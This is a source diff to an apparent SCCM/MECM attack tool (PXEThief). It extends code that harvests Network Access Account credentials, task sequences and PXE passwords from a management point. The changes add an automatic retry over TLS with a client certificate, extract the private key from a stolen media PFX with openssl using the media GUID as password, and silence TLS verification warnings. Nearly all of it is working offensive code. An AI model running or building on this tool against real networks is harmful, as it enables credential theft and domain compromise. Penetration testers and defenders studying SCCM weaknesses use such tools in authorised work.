@@ -13,6 +13,7 @@ import binascii
 import string
 import ipaddress
 import socket
+import subprocess
 import platform
 import configparser
 import media_variable_file_cryptography as media_crypto
@@ -22,14 +23,14 @@ import requests
 from requests_toolbelt import MultipartEncoder,MultipartDecoder
 import zlib
 import datetime
-from os import walk,system
+import urllib3
+from os import walk,system,path
 from ipaddress import IPv4Network,IPv4Address
 from certipy.lib.certificate import load_pfx
 from sccmwtf import SCCMTools, Tools, CryptoTools, policyBody, msgHeaderPolicy, msgHeader, dateFormat1
 from cryptography.hazmat.primitives.asymmetric import padding
 import tftpy
 from asn1crypto import cms
-import hexdump
 
 #Scapy global variables
 osName = platform.system()
@@ -42,6 +43,9 @@ USING_PROXY = False #Configure proxying for debugging support
 USING_TLS = False #HTTPS and client certificate support
 CERT_FILE = "output.crt"
 KEY_FILE = "output-key.key"
+
+# Disable unverified request warnings 
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 
 
 # MECM Task Sequence Config Options
 SCCM_BASE_URL = "" #The beginning of the DP URL as read from settings.ini; takes precedence over the value retrieved from the media file in decrypt_media_file(), if needed
@@ -750,6 +754,7 @@ def analyse_task_sequence_for_potential_creds(ts_xml):
 
 #Retrieve all available TSs, the NAA config and any identified collection settings and return to parsing function
 def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClientIDSignature,CCMClientTimestamp,CCMClientTimestampSignature,clientTokenSignature,key):
+    global USING_TLS
 
     #ClientID is x64UnknownMachineGUID from /SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA request
     #print("[+] Retrieving Needed Metadata from SCCM Server...")
@@ -767,6 +772,15 @@ def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClient
     #ClientID is x64UnknownMachineGUID from /SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA request
     print("[+] Retrieving x64UnknownMachineGUID from MECM MP...")
     r = session.get(sccm_base_url + "/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA")
+
+    if r.status_code == 403 and USING_TLS == False:
+        print("[-] MECM MP responded with: 403 - Forbidden")
+        print("[*] The server may required TLS with a client certificate.")
+        if path.exists(CERT_FILE) and path.exists(KEY_FILE):
+            print("[+] Certificate {CERT_FILE} and key {KEY_FILE} exist. Trying to enable TLS with client certificate")
+            USING_TLS = True
+            print("[*] Retrying with enabled TLS")
+            return make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClientIDSignature,CCMClientTimestamp,CCMClientTimestampSignature,clientTokenSignature,key)
 
     #Parse XML and retrieve x64UnknownMachineGUID
     root = ET.fromstring(r.text)
@@ -812,7 +826,7 @@ def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID,CCMClient
                 allPoliciesURLs[policy.get("PolicyCategory")] = policy.find("PolicyLocation").text.replace("http://<mp>",sccm_base_url) 
             else:
                 if policy.get("PolicyCategory") is None:
-                    allPoliciesURLs["".join(i for i in policy.get("PolicyID") if i not in "\/:*?<>|")] = policy.find("PolicyLocation").text.replace("http://<mp>",sccm_base_url) 
+                    allPoliciesURLs["".join(i for i in policy.get("PolicyID") if i not in "\\/:*?<>|")] = policy.find("PolicyLocation").text.replace("http://<mp>",sccm_base_url) 
                 else:
                     allPoliciesURLs[policy.get("PolicyCategory") + str(dedup)] = policy.find("PolicyLocation").text.replace("http://<mp>",sccm_base_url) 
                     dedup = dedup + 1
@@ -878,6 +892,30 @@ def write_default_config_file():
     with open('settings.ini', 'w') as configfile:
       config.write(configfile)
 
+def generate_cert_and_key_from_pfx(pfx_file, password, output_key_file, output_cert_file):
+    try:
+        # Step 1: Extract the private key from the PFX file
+        key_command = [
+            "openssl", "pkcs12", "-in", pfx_file, "-nocerts", "-out", output_key_file,
+            "-passin", f"pass:{password}", "-nodes"
+        ]
+        subprocess.run(key_command, check=True, text=True)
+        print(f"[+] Private key extracted to: {output_key_file}")
+
+        # Step 2: Extract the certificate from the PFX file
+        cert_command = [
+            "openssl", "pkcs12", "-in", pfx_file, "-clcerts", "-nokeys", "-out", output_cert_file,
+            "-passin", f"pass:{password}"
+        ]
+        subprocess.run(cert_command, check=True, text=True)
+        print(f"[+] Certificate extracted to: {output_cert_file}")
+    except subprocess.CalledProcessError as e:
+        print(f"[-] Error during OpenSSL command execution: {e}")
+    except FileNotFoundError:
+        print("[-] OpenSSL is not installed or not found in the PATH.")
+    except Exception as ex:
+        print(f"[-] An unexpected error occurred: {ex}")
+
 if __name__ == "__main__":
     name = r""" 
  ________  ___    ___ _______  _________  ___  ___  ___  _______   ________ 
@@ -899,7 +937,7 @@ if __name__ == "__main__":
         print("%s 4 <variables-file-name> <policy-file-path> <password> - Attempt to decrypt a saved media variables file and Task Sequence XML file retrieved from a full TS media" % sys.argv[0])
         print("%s 5 <variables-file-name> - Print the hash corresponding to a specified media variables file for cracking in hashcat" % sys.argv[0])
         print("%s 6 <identityguid> <identitycert-file-name> - Retrieve task sequences using the values obtained from registry keys on a DP" % sys.argv[0])
-        print("%s 7 <Reserved1-value> - Decrypt stored PXE password from SCCM DP registry key (reg query HKLM\software\microsoft\sms\dp /v Reserved1)" % sys.argv[0])
+        print("%s 7 <Reserved1-value> - Decrypt stored PXE password from SCCM DP registry key (reg query HKLM\\software\\microsoft\\sms\\dp /v Reserved1)" % sys.argv[0])
         print("%s 8 - Write new default settings.ini file in PXEThief directory" % sys.argv[0])
         print("%s 10 - Print Scapy interface table to identify interface indexes for use in 'settings.ini'" % sys.argv[0])
 
@@ -951,6 +989,7 @@ if __name__ == "__main__":
     
         print("[!] Writing _SMSTSMediaPFX to "+ filename + ". Certificate password is " + smsMediaGuid)
         write_to_binary_file(filename,smsTSMediaPFX)
+        generate_cert_and_key_from_pfx(filename, smsMediaGuid, "output-key.key", "output.crt")
     
         process_pxe_bootable_and_prestaged_media(media_variables)
 
